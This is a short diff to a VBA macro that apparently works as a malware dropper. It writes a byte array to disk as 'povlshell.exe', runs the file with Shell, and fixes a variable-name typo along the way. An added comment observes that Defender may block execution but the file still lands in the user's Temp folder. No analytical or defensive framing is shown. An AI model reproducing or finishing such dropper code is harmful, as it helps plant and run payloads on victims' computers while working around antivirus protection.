@@ -14,8 +14,8 @@ Sub AddNull()
  
  Dim Arraylength as Long
  Arraylength = UBound(Bytearray, 1) - LBound(Bytearray, 1) + 1
- ReDim Preserve Bytearray(Arraylenght)
- Bytearray(Arraylenght) = 0
+ ReDim Preserve Bytearray(Arraylength)
+ Bytearray(Arraylength) = 0
  
  bin.Open
  bin.Write Bytearray
@@ -26,7 +26,8 @@ Sub AddNull()
  name = "povlshell.exe"
  newFilename = dir & "\\" & name
  bin.SaveToFile newFilename, 2
- 
+
+' Shell run might be blocked by Defender, but the file is created under C:\Users\USERNAME\Appdata\local\TEMP\
  Dim retval
  retval = Shell(newFilename)
  
